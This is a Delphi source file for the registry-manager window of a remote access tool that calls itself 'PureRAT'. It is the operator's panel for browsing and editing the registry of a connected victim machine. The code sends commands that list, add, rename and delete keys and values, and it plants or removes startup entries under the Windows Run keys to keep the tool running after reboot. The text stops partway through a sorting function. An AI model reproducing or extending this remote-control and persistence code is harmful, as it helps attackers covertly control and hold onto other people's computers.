unit UnitRegistryManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ToolWin, acPNG, ExtCtrls, acImage, jpeg, UnitMain, Menus,
  ImgList, SocketUnitEx, UnitFunctions, UnitCommands, UnitConstants, StdCtrls,
  UnitVariables, UnitManager;

type
  TFormRegistryManager = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    btn2: TToolButton;
    btn5: TToolButton;
    pb1: TProgressBar;
    pnlEditor: TPanel;
    pnlStartup: TPanel;
    lvStartup: TListView;
    tv1: TTreeView;
    lvReg: TListView;
    spl1: TSplitter;
    pm1: TPopupMenu;
    V1: TMenuItem;
    V3: TMenuItem;
    pm2: TPopupMenu;
    N2: TMenuItem;
    R2: TMenuItem;
    il1: TImageList;
    R3: TMenuItem;
    N3: TMenuItem;
    N4: TMenuItem;
    R4: TMenuItem;
    pm3: TPopupMenu;
    N5: TMenuItem;
    D2: TMenuItem;
    R1: TMenuItem;
    N6: TMenuItem;
    R5: TMenuItem;
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure lvRegContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R4Click(Sender: TObject);
    procedure lvRegCustomDrawItem(Sender: TCustomListView; Item: TListItem;
      State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure tv1DblClick(Sender: TObject);
    procedure V1Click(Sender: TObject);
    procedure V3Click(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure N2Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure lvStartupCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure lvStartupContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure N5Click(Sender: TObject);
    procedure tv1Change(Sender: TObject; Node: TTreeNode);
    procedure tv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure D2Click(Sender: TObject);
    procedure lvStartupKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure tv1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure lvRegKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure R1Click(Sender: TObject);
    procedure R5Click(Sender: TObject);
    procedure lvRegColumnClick(Sender: TObject; Column: TListColumn);
  private
    { Private declarations } 
    Client: TClientDatas;
    RegistryPath: string;
    LastNode: TTreeNode;
    procedure SetRegistryPath(rPath: string); 
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }                 
    constructor Create(aOwner: TComponent; _Client: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormRegistryManager: TFormRegistryManager;

implementation

uses
  UnitRegistryEditor;
                         
var
  LastColumn: TListColumn;
  Ascending: Boolean;
  
const
  HKLMRun = 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\';
  HKCURun = 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\';

{$R *.dfm}
         
constructor TFormRegistryManager.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;

procedure TFormRegistryManager.AddSentLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormRegistryManager.AddRecvLog(Log: string; lColor: TColor);
begin
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormRegistryManager.btn1Click(Sender: TObject);
begin
  pnlEditor.BringToFront;
end;

procedure TFormRegistryManager.btn2Click(Sender: TObject);
begin
  pnlStartup.BringToFront;
  if lvStartup.Items.Count = 0 then R3Click(Sender);
end;

procedure TFormRegistryManager.FormCreate(Sender: TObject);
begin
  tv1.Images := FormMain.ImagesList;
end;
           
procedure TFormRegistryManager.FormShow(Sender: TObject);
var
  KeysNode, TmpNode: TTreeNode;
begin
  btn1Click(Sender);
  if tv1.Items.Count <> 0 then Exit;

  tv1.Items.BeginUpdate;
  KeysNode := tv1.Items.Add(nil, Client.Infos.Computer);
  KeysNode.ImageIndex := 15;
  KeysNode.SelectedIndex := 15;

  TmpNode := tv1.Items.AddChild(KeysNode, 'HKEY_CLASSES_ROOT');
  TmpNode.ImageIndex := 3;
  TmpNode.SelectedIndex := 3;
  TmpNode := tv1.Items.AddChild(KeysNode, 'HKEY_CURRENT_USER');
  TmpNode.ImageIndex := 3;
  TmpNode.SelectedIndex := 3;   
  TmpNode := tv1.Items.AddChild(KeysNode, 'HKEY_LOCAL_MACHINE');
  TmpNode.ImageIndex := 3;
  TmpNode.SelectedIndex := 3;
  TmpNode := tv1.Items.AddChild(KeysNode, 'HKEY_USERS');
  TmpNode.ImageIndex := 3;
  TmpNode.SelectedIndex := 3;
  TmpNode := tv1.Items.AddChild(KeysNode, 'HKEY_CURRENT_CONFIG');
  TmpNode.ImageIndex := 3;
  TmpNode.SelectedIndex := 3;

  KeysNode.Expanded := True;
  tv1.Items.EndUpdate;
end;

procedure TFormRegistryManager.WndProc(var Msg: TMessage);
var
  MainCommand, Datas: string;
  TmpStr, TmpStr1: string;
  i, j: Integer;
  TmpItem: TListItem;
  TmpList: TStringArray;
  TmpNode: TTreeNode;
  BA: TByteArray;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);
    MainCommand := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MainCommand = REGISTRYLISTKEYS then
    begin
      LastNode.DeleteChildren;
                
      if Datas = '' then
      begin
        AddRecvLog('Keys not found', clRed);            
        tv1.Enabled := True;
        Exit;
      end;

      pb1.Max := StringCount(#13#10, Datas);
      pb1.Position := 0;

      tv1.Items.BeginUpdate;

      while Datas <> '' do
      begin
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;

        TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
        Delete(Datas, 1, Pos('|', Datas));

        TmpNode := tv1.Items.AddChild(LastNode, TmpStr);
        TmpNode.ImageIndex := 3;
        TmpNode.SelectedIndex := 3;
      end;

      tv1.Items.EndUpdate;
      LastNode.Expanded := True;
      AddRecvLog(IntToStr(tv1.Selected.Count) + ' keys found');    
      tv1.Enabled := True;
    end
    else

    if MainCommand = REGISTRYLISTVALUES then
    begin
      lvReg.Clear;

      if Datas = '' then
      begin
        AddRecvLog('Values not found', clRed);
        Exit;
      end;

      pb1.Max := StringCount(#13#10, Datas);
      pb1.Position := 0;

      lvReg.Items.BeginUpdate;

      while Datas <> '' do
      begin
        Self.Refresh;
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;
                 
        TmpStr := Copy(Datas, 1, Pos(#13#10, Datas) - 1);
        Delete(Datas, 1, Pos(#13#10, Datas) + 1);

        TmpList := ParseString('|', TmpStr);

        TmpItem := lvReg.Items.Add;
        if TmpList[0] = Client.Infos.Computer then TmpItem.Data := TObject(clRed);
        TmpItem.Caption := TmpList[0];
        TmpItem.SubItems.Add(TmpList[1]);
        TmpItem.SubItems.Add(TmpList[2]);

        if (TmpItem.SubItems[0] = 'REG_DWORD') or (TmpItem.SubItems[0] = 'REG_BINARY') then
          TmpItem.ImageIndex := 3
        else TmpItem.ImageIndex := 2;
      end;

      lvReg.Items.EndUpdate;      
      AddRecvLog(IntToStr(lvReg.Items.Count) + ' values found');
    end
    else     
  
    if MainCommand = REGISTRYSTARTUPLIST then
    begin
      lvStartup.Clear;

      if Datas = '' then
      begin
        AddRecvLog('Startup items not found', clRed);
        Exit;
      end;

      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));

      pb1.Max := StringCount(#13#10, Datas);
      pb1.Position := 0;

      lvStartup.Items.BeginUpdate;

      while Datas <> '' do
      begin                                 
        Self.Refresh;
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;
                 
        TmpStr1 := Copy(Datas, 1, Pos(#13#10, Datas) - 1);
        Delete(Datas, 1, Pos(#13#10, Datas) + 1);

        TmpList := ParseString('|', TmpStr1);

        TmpItem := lvStartup.Items.Add;
        if TmpList[0] = Client.Infos.RegKey then TmpItem.Data := TObject(clRed);
        TmpItem.Caption := TmpList[0];
        TmpItem.SubItems.Add(TmpList[1]);
        TmpItem.SubItems.Add(TmpList[2]);  
        TmpItem.SubItems.Add(TmpStr);

        if (TmpItem.SubItems[0] = 'REG_DWORD') or (TmpItem.SubItems[0] = 'REG_BINARY') then
          TmpItem.ImageIndex := 3
        else TmpItem.ImageIndex := 2;
      end;

      lvStartup.Items.EndUpdate;
      AddRecvLog(IntToStr(lvStartup.Items.Count) + ' startup items found');
    end
    else

    if MainCommand = REGISTRYDELETEKEY_VALUE then
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[2] = 'N' then
        AddRecvLog('Failed to delete key/value ' + TmpList[1], clRed)
      else
      begin
        if TmpList[0] <> '' then
        begin
          tv1.Items.BeginUpdate;
          TmpList[0] := TmpList[0] + '\' + TmpList[1] + '\';
          LastNode := nil;

          AddRecvLog('Key ' + TmpList[1] + ' deleted successfully');

          while Pos('\', TmpList[0]) > 0 do
          begin
            Application.ProcessMessages;
            TmpStr := Copy(TmpList[0], 1, Pos('\', TmpList[0]) - 1);
            Delete(TmpList[0], 1, Pos('\', TmpList[0]));
            TmpNode := FindNode(TmpStr, tv1, LastNode);
            if TmpStr = '' then Continue;
            LastNode := TmpNode;
          end;

          LastNode.Delete;
          tv1.Items.EndUpdate;
          lvReg.Clear;
        end
        else
        begin
          lvReg.Items.BeginUpdate;
          for i := 0 to lvReg.Items.Count - 1 do
          begin
            Application.ProcessMessages;
            if lvReg.Items.Item[i].Caption <> TmpList[1] then Continue;
            lvReg.Items.Item[i].Delete;
            Break;
          end;

          lvReg.Items.EndUpdate;
          AddRecvLog('Value ' + TmpList[1] + ' deleted successfully');
        end;
      end;
    end
    else
             
    if MainCommand = REGISTRYRENAMEKEY then
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[3] = 'N' then
        AddRecvLog('Failed to rename key ' + TmpList[1] + ' by ' + TmpList[2] , clRed)
      else
      begin
        if TmpList[0] <> '' then
        begin
          tv1.Items.BeginUpdate;
          TmpList[0] := TmpList[0] + '\' + TmpList[1] + '\';
          LastNode := nil;

          AddRecvLog('Key ' + TmpList[1] + ' renamed successfully by ' + TmpList[2]);

          while Pos('\', TmpList[0]) > 0 do
          begin
            Application.ProcessMessages;
            TmpStr := Copy(TmpList[0], 1, Pos('\', TmpList[0]) - 1);
            Delete(TmpList[0], 1, Pos('\', TmpList[0]));
            TmpNode := FindNode(TmpStr, tv1, LastNode);
            if TmpStr = '' then Continue;
            LastNode := TmpNode;
          end;

          LastNode.Text := TmpList[2];
          tv1.Items.EndUpdate;
        end;
      end;
    end
    else

    if MainCommand = REGISTRYADDKEY_VALUE then
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[4] = 'N' then
        AddRecvLog('Failed to add key/value ' + TmpList[1], clRed)
      else
      begin
        if TmpList[3] = '' then
        begin
          tv1.Items.BeginUpdate;
          TmpList[0] := TmpList[0] + '\' + TmpList[1] + '\';
          LastNode := nil;

          AddRecvLog('Key ' + TmpList[1] + ' added successfully');

          while Pos('\', TmpList[0]) > 0 do
          begin
            Application.ProcessMessages;
            TmpStr := Copy(TmpList[0], 1, Pos('\', TmpList[0]) - 1);
            Delete(TmpList[0], 1, Pos('\', TmpList[0]));

            TmpNode := FindNode(TmpStr, tv1, LastNode);
            if TmpNode = nil then
            begin
              if TmpStr = '' then Continue;
              TmpNode := tv1.Items.AddChild(LastNode, TmpStr);
              TmpNode.ImageIndex := 3;
              TmpNode.SelectedIndex := 3;
              TmpNode.Expand(False);
            end
            else TmpNode.Expand(False);

            if TmpNode.Parent <> nil then TmpNode.Parent.Expand(False);
            LastNode := TmpNode;
            LastNode.Expand(False);
          end;

          tv1.Items.EndUpdate;
        end
        else
        begin
          lvReg.Items.BeginUpdate;
                                                             
          TmpItem := lvReg.Items.Add;
          TmpItem.Caption := TmpList[1];
          TmpItem.SubItems.Add(TmpList[2]);

          if TmpList[2] <> 'REG_BINARY' then TmpItem.SubItems.Add(TmpList[3]) else
          begin
            BA := StrToByteArray(TmpList[3]);
            for i := 0 to SizeOf(BA) - 1 do TmpStr := TmpStr + IntToHex(Ord(BA[i]), 2) + ' ';
            TmpItem.SubItems.Add(TmpStr);
          end;

          if (TmpList[2] = 'REG_DWORD') or (TmpList[2] = 'REG_BINARY') then
            TmpItem.ImageIndex := 3
          else TmpItem.ImageIndex := 2;

          lvReg.Items.EndUpdate;
          AddRecvLog('Value ' + TmpList[1] + ' added successfully');
        end;
      end;
    end
    else
              
    if MainCommand = REGISTRYRENAMEVALUE then
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[4] = 'N' then
        AddRecvLog('Failed to rename value ' + TmpList[1] + ' by ' + TmpList[2], clRed)
      else
      begin
        if TmpList[3] <> '' then
        begin
          lvReg.Items.BeginUpdate;

          for i := 0 to lvReg.Items.Count - 1 do
          begin
            if lvReg.Items.Item[i].Caption <> TmpList[1] then Continue;
            lvReg.Items.Item[i].Caption := TmpList[2];
            lvReg.Items.Item[i].SubItems[0] := TmpList[3];

            if TmpList[3] <> 'REG_BINARY' then lvReg.Items.Item[i].SubItems[1] := TmpList[4] else
            begin
              BA := StrToByteArray(TmpList[4]);
              for j := 0 to SizeOf(BA) - 1 do TmpStr := TmpStr + IntToHex(Ord(BA[j]), 2) + ' ';
              lvReg.Items.Item[i].SubItems[1] := TmpStr;
            end;
          end;

          lvReg.Items.EndUpdate;
          AddRecvLog('Value ' + TmpList[1] + ' renamed by ' + TmpList[2] + ' successfully');
        end;
      end;
    end
    else

    if MainCommand = REGISTRYSTARTUPADD then
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[4] = 'N' then
        AddRecvLog('Failed to add startup item ' + TmpList[1], clRed)
      else
      begin
        if TmpList[3] <> '' then
        begin
          lvStartup.Items.BeginUpdate;
                                                             
          TmpItem := lvStartup.Items.Add;
          TmpItem.Caption := TmpList[1];
          TmpItem.SubItems.Add(TmpList[2]);
          TmpItem.SubItems.Add(TmpList[3]);   
          TmpItem.SubItems.Add(TmpList[0]);

          if (TmpList[2] = 'REG_DWORD') or (TmpList[2] = 'REG_BINARY') then
            TmpItem.ImageIndex := 3
          else TmpItem.ImageIndex := 2;

          lvStartup.Items.EndUpdate;
          AddRecvLog('Startup item ' + TmpList[1] + ' added successfully');
        end;
      end;
    end
    else

    if MainCommand = REGISTRYSTARTUPDELETE then
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[2] = 'N' then
        AddRecvLog('Failed to delete startup item ' + TmpList[1], clRed)
      else
      begin
        if TmpList[0] = '' then
        begin
          lvStartup.Items.BeginUpdate;
          for i := 0 to lvStartup.Items.Count - 1 do
          begin
            Application.ProcessMessages;
            if lvStartup.Items.Item[i].Caption <> TmpList[1] then Continue;
            lvStartup.Items.Item[i].Delete;
            Break;
          end;

          lvStartup.Items.EndUpdate;
          AddRecvLog('Startup item ' + TmpList[1] + ' deleted successfully');
        end;
      end;
    end;
  end;
end;

procedure TFormRegistryManager.lvRegCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormRegistryManager.lvStartupCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormRegistryManager.lvStartupContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvReg.Selected) then
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;
    pm2.Items[0].Enabled := True;
    pm2.Items[2].Enabled := True;
  end
  else for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;
end;

procedure TFormRegistryManager.lvRegContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvReg.Selected) then
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := False;
    pm1.Items[0].Enabled := True;
    pm1.Items[2].Enabled := True;
  end
  else for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := True;
end;

procedure TFormRegistryManager.SetRegistryPath(rPath: string);
var
  TmpStr: string;
begin
  if (rPath = 'HKEY_CLASSES_ROOT\') or (rPath = 'HKEY_CURRENT_USER\') or
    (rPath = 'HKEY_LOCAL_MACHINE\') or (rPath = 'HKEY_USERS\') or
    (rPath = 'HKEY_CURRENT_CONFIG\') or (rPath = '')
  then
  begin
    RegistryPath := rPath;
    Exit;
  end;

  TmpStr := Copy(rPath, 1, Length(rPath) - 1);
  Delete(TmpStr, LastDelimiter('\', TmpStr) + 1, Length(TmpStr));
  RegistryPath := TmpStr + LastNode.Text + '\';
end;

procedure TFormRegistryManager.R4Click(Sender: TObject);
begin
  if RegistryPath = '' then Exit;
  Client.SendDatas(REGISTRYLISTVALUES + '|' + RegistryPath);
  AddSentLog('Get values of ' + RegistryPath);
end;

procedure TFormRegistryManager.tv1DblClick(Sender: TObject);
begin
  if (RegistryPath = '') or (RegistryPath = Client.Infos.Computer) then Exit;
  if Copy(RegistryPath, 1, Pos('\', RegistryPath) - 1) = Client.Infos.Computer then
    Delete(RegistryPath, 1, Length(Client.Infos.Computer) + 1);  
  tv1.Enabled := False;
  Client.SendDatas(REGISTRYLISTKEYS + '|' + RegistryPath);
  AddSentLog('Set registry path to ' + RegistryPath);
end;

procedure TFormRegistryManager.V1Click(Sender: TObject);
var
  TmpForm: TFormRegistryEditor;
  TmpStr, RegValue: string;
  i, j: Integer;
begin
  if RegistryPath = '' then Exit;

  TmpForm := TFormRegistryEditor.Create(Application);
  TmpForm.edtName.Text := 'PureRAT';
  TmpForm.edt1.Text := 'Pure Remote Administration Tool by wrh1d3';
  TmpForm.mmoData.Text := 'Pure Remote Administration Tool' + #13#10 + 'by wrh1d3' ;
  TmpForm.rgType.ItemIndex := 1;
  TmpForm.cbbHKEY.Enabled := False;
  TmpForm.rgTypeClick(Sender);

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  if (TmpForm.edtName.Text = '') and
    ((TmpForm.mmoData.Text = '') or (TmpForm.edt1.Text = ''))
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  i := TmpForm.rgType.ItemIndex;
  TmpStr := TmpForm.mmoData.Text;

  case i of
    0: RegValue := TmpForm.edt1.Text;
    1:  begin
          while Pos(#13#10, TmpStr) > 0 do
          begin
            RegValue := RegValue + Copy(TmpStr, 1, Pos(#13#10, TmpStr) - 1) + #0;
            Delete(TmpStr, 1, Pos(#13#10, TmpStr));
          end;
          RegValue := RegValue + #0;
        end;
    2: RegValue := TmpForm.edt1.Text;
    3:  begin
          RegValue := TmpForm.edt1.Text;
          if TmpForm.rg1.ItemIndex = 0 then
          RegValue := '$' + RegValue;
        end;
    4: RegValue := ByteArrayToStr(TmpForm.mphxdtrx1.FastPointer);
  end;

  Client.SendDatas(REGISTRYADDKEY_VALUE + '|' + RegistryPath + '|' + TmpForm.edtName.Text + '|' +
    TmpForm.rgType.Items.Strings[i] + '|' + RegValue + '|');
  AddSentLog('Add new value ' + TmpForm.edtName.Text + ' with datas ' + RegValue + ' to ' + RegistryPath);

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormRegistryManager.V3Click(Sender: TObject);
begin
  if RegistryPath = '' then Exit;
  if not Assigned(lvReg.Selected) then Exit;

  if MessageBox(Handle, PChar('Are you sure you want to delete registry value "' + lvReg.Selected.Caption + '"?'),
    PChar(PROGRAMINFOS), MB_ICONWARNING + MB_YESNOCANCEL) <> IDYES
  then Exit;

  Client.SendDatas(REGISTRYDELETEKEY_VALUE + '|' + RegistryPath + '|' + lvReg.Selected.Caption + '|N');
  AddSentLog('Delete registry value ' + lvReg.Selected.Caption + ' of key ' + RegistryPath);
end;

procedure TFormRegistryManager.R3Click(Sender: TObject);
begin
  Client.SendDatas(REGISTRYSTARTUPLIST + '|');
  AddSentLog('Get registry startup list');
end;

procedure TFormRegistryManager.N2Click(Sender: TObject);
var
  TmpForm: TFormRegistryEditor;
  TmpStr: string;
  i, j: Integer;
begin
  TmpForm := TFormRegistryEditor.Create(Application);
  TmpForm.edtName.Text := 'PureRAT';
  TmpForm.mmoData.Text := 'Pure Remote Administration Tool by wrh1d3';
  TmpForm.rgType.ItemIndex := 0;
  TmpForm.cbbHKEY.ItemIndex := 1;
  TmpForm.rg1Click(Sender);

  TmpForm.rgType.Enabled := False;
  TmpForm.cbbHKEY.Enabled := True;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  if (TmpForm.edtName.Text = '') and
    ((TmpForm.mmoData.Text = '') or (TmpForm.edt1.Text = ''))
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  i := TmpForm.rgType.ItemIndex;
  j := TmpForm.cbbHKEY.ItemIndex;

  case j of
    0: TmpStr := HKLMRun;
    1: TmpStr := HKCURun;
  end;

  Client.SendDatas(REGISTRYSTARTUPADD + '|' + TmpStr + '|' + TmpForm.edtName.Text + '|' +
    TmpForm.rgType.Items.Strings[i] + '|' + TmpForm.edt1.Text + '|');
  AddSentLog('Add new value ' + TmpForm.edtName.Text + ' with datas ' + TmpForm.edt1.Text + ' to ' + TmpStr);

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormRegistryManager.R2Click(Sender: TObject);
begin
  if MessageBox(Handle, PChar('Are you sure you want to delete registry startup entry "' + lvStartup.Selected.Caption + '"?'),
    PROGRAMINFOS, MB_ICONWARNING + MB_YESNOCANCEL) <> IDYES
  then Exit;

  Client.SendDatas(REGISTRYSTARTUPDELETE + '|' + lvStartup.Selected.SubItems[2] + '|' +
    lvStartup.Selected.Caption + '|N');
  AddSentLog('Delete registry startup item ' + lvStartup.Selected.Caption);
end;

procedure TFormRegistryManager.N5Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(tv1.Selected) then Exit;
  if (RegistryPath = '') or (RegistryPath = Client.Infos.Computer) then Exit;
  if not InputQuery('New registry key', 'Enter key name', TmpStr) then Exit;
  Client.SendDatas(REGISTRYADDKEY_VALUE + '|' + RegistryPath + '|' + TmpStr + '|');
  AddSentLog('Add new key ' + TmpStr + ' to ' + RegistryPath);
end;

procedure TFormRegistryManager.tv1Change(Sender: TObject; Node: TTreeNode);
begin
  LastNode := tv1.Selected;
  SetRegistryPath(GetNodeRoot(LastNode));
  if (RegistryPath = '') or (RegistryPath = Client.Infos.Computer) then Exit;
  if Copy(RegistryPath, 1, Pos('\', RegistryPath) - 1) = Client.Infos.Computer then
    Delete(RegistryPath, 1, Length(Client.Infos.Computer) + 1);
  Client.SendDatas(REGISTRYLISTVALUES + '|' + RegistryPath);   
  AddSentLog('Get values of ' + RegistryPath);
end;

procedure TFormRegistryManager.tv1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(tv1.Selected) then
    for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := False
  else for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := True;
end;

procedure TFormRegistryManager.D2Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  if not Assigned(tv1.Selected) then Exit;
  
  if (RegistryPath = 'HKEY_CLASSES_ROOT\') or (RegistryPath = 'HKEY_CURRENT_USER\') or
    (RegistryPath = 'HKEY_LOCAL_MACHINE\') or (RegistryPath = 'HKEY_USERS\') or
    (RegistryPath = 'HKEY_CURRENT_CONFIG\') or (RegistryPath = '')
  then Exit;

  TmpStr := RegistryPath;
  TmpStr1 := Copy(TmpStr, 1, LastDelimiter('\', TmpStr) - 1);
  Delete(TmpStr1, 1, LastDelimiter('\', TmpStr1));
  Delete(TmpStr, Pos(TmpStr1, TmpStr), Length(TmpStr));

  if MessageBox(Handle, PChar('Are you sure you want to delete registry key "' + TmpStr1 + '"?'),
    PChar(PROGRAMINFOS), MB_ICONWARNING + MB_YESNOCANCEL) <> IDYES
  then Exit;

  Client.SendDatas(REGISTRYDELETEKEY_VALUE + '|' + TmpStr + '|' + TmpStr1 + '|Y');
  AddSentLog('Delete registry key ' + TmpStr1);
end;

procedure TFormRegistryManager.lvStartupKeyDown(Sender: TObject;
  var Key: Word; Shift: TShiftState);
begin
  if not Assigned(lvStartup.Selected) then Exit;
  if Key = VK_DELETE then R2Click(R2);
end;

procedure TFormRegistryManager.tv1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if not Assigned(tv1.Selected) then Exit;
  if Key = VK_DELETE then D2Click(D2);
end;

procedure TFormRegistryManager.lvRegKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if not Assigned(lvReg.Selected) then Exit;
  if Key = VK_DELETE then V3Click(V3) else
  if Key = VK_INSERT then V1Click(V1);
end;

procedure TFormRegistryManager.R1Click(Sender: TObject);
var
  TmpStr, TmpStr1, NewKey: string;
begin
  if not Assigned(tv1.Selected) then Exit;
  
  if (RegistryPath = 'HKEY_CLASSES_ROOT\') or (RegistryPath = 'HKEY_CURRENT_USER\') or
    (RegistryPath = 'HKEY_LOCAL_MACHINE\') or (RegistryPath = 'HKEY_USERS\') or
    (RegistryPath = 'HKEY_CURRENT_CONFIG\') or (RegistryPath = '')
  then Exit;

  if not InputQuery('Rename registry key', 'Enter key name', NewKey) then Exit;
                                           
  TmpStr := RegistryPath;
  TmpStr1 := Copy(TmpStr, 1, LastDelimiter('\', TmpStr) - 1);
  Delete(TmpStr1, 1, LastDelimiter('\', TmpStr1));
  if TmpStr1 = NewKey then Exit;

  Client.SendDatas(REGISTRYRENAMEKEY + '|' + TmpStr + '|' + TmpStr1 + '|' + NewKey);
  AddSentLog('Rename registry key ' + TmpStr1 + ' by ' + NewKey);
end;

procedure TFormRegistryManager.R5Click(Sender: TObject);
var
  TmpForm: TFormRegistryEditor;
  TmpStr, RegValue: string;
  BA: TByteArray;
  i, j: Integer;
begin
  if RegistryPath = '' then Exit;
  if not Assigned(lvReg.Selected) then Exit;

  TmpForm := TFormRegistryEditor.Create(Application);
  TmpForm.edtName.Text := lvReg.Selected.Caption;

  if lvReg.Selected.SubItems[0] = 'REG_SZ' then TmpForm.rgType.ItemIndex := 0 else
  if lvReg.Selected.SubItems[0] = 'REG_MULTI_SZ' then TmpForm.rgType.ItemIndex := 1 else
  if lvReg.Selected.SubItems[0] = 'REG_EXPAND_SZ' then TmpForm.rgType.ItemIndex := 2 else
  if lvReg.Selected.SubItems[0] = 'REG_DOWRD' then TmpForm.rgType.ItemIndex := 3 else
  if lvReg.Selected.SubItems[0] = 'REG_BINARY' then TmpForm.rgType.ItemIndex := 4;

  case TmpForm.rgType.ItemIndex of
    0, 2: TmpForm.edt1.Text := lvReg.Selected.SubItems[1];
    3:  begin
          TmpForm.edt1.Text := lvReg.Selected.SubItems[1];
          TmpForm.rg1Click(Sender);
        end;
    1: TmpForm.mmoData.Text := lvReg.Selected.SubItems[1];
    4: TmpForm.mphxdtrx1.AsHex := lvReg.Selected.SubItems[1];
  end;

  TmpForm.cbbHKEY.Enabled := False;
  TmpForm.rgTypeClick(Sender);

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  if (TmpForm.edtName.Text = '') and
    ((TmpForm.mmoData.Text = '') or (TmpForm.edt1.Text = ''))
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  i := TmpForm.rgType.ItemIndex;

  if (TmpForm.edtName.Text = lvReg.Selected.Caption) and
    (TmpForm.rgType.Items.Strings[i] = lvReg.Selected.SubItems[0]) and
    ((TmpForm.mmoData.Text = lvReg.Selected.SubItems[1]) or (TmpForm.edt1.Text = lvReg.Selected.SubItems[1]))
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  TmpStr := TmpForm.mmoData.Text;

  case i of
    0: RegValue := TmpForm.edt1.Text;
    1:  begin
          while Pos(#13#10, TmpStr) > 0 do
          begin
            RegValue := RegValue + Copy(TmpStr, 1, Pos(#13#10, TmpStr) - 1) + #0;
            Delete(TmpStr, 1, Pos(#13#10, TmpStr));
          end;
          RegValue := RegValue + #0;
        end;
    2: RegValue := TmpForm.edt1.Text;
    3:  begin
          RegValue := TmpForm.edt1.Text;
          if TmpForm.rg1.ItemIndex = 0 then
          RegValue := '$' + RegValue;
        end;
    4: RegValue := ByteArrayToStr(TmpForm.mphxdtrx1.FastPointer);
  end;

  Client.SendDatas(REGISTRYRENAMEVALUE + '|' + RegistryPath + '|' + lvReg.Selected.Caption + '|' +
    TmpForm.edtName.Text + '|' + TmpForm.rgType.Items.Strings[i] + '|' + RegValue + '|');
  AddSentLog('Rename value ' + lvReg.Selected.Caption + ' by ' + TmpForm.edtName.Text);

  TmpForm.Release;
  TmpForm := nil;
end;
     
function SortByColumn(Item1, Item2: TListItem; Data: Integer): Integer; stdcall;
begin
  if LastColumn.Index <> 0 then Exit;
  if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption) else
